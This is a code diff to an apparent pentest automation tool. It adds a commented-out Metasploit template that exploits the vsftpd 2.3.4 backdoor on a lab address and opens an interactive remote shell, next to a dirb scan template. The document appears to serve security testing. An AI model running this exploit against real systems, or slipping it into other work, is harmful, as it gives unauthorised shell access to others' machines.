@@ -62,6 +62,9 @@ COMMAND_TEMPLATES: Dict[str, Dict[str, List[str]]] = {
         "dirb": [
             #"dirb http://{ip}/ /mnt/linux-data/wordlists/SecLists/Discovery/Web-Content/common.txt"
         ],
+        "metasploit": [
+            #"""msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set PAYLOAD payload/cmd/unix/interact; set RHOST 192.168.56.101; set RPORT 21; run -z; sessions 1 -i; sessions -K; exit -y'"""
+        ]
     },
 }
 
